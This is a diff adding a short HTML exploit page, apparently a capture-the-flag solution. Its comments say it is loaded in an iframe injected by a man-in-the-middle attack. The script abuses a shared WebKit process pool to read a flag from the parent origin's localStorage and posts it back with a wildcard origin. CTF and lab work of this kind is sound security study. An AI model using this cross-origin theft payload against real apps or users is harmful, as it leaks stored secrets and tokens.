@@ -1,0 +1,10 @@
+<!DOCTYPE html><html><body><script>
+// This page is loaded in an iframe injected via MITM
+// It reads localStorage from the parent origin due to shared WKProcessPool
+try {
+    var flag = localStorage.getItem('ctf_w6_flag');
+    parent.postMessage(flag || 'not found', '*');
+} catch(e) {
+    parent.postMessage('error: ' + e.message, '*');
+}
+</script></body></html>
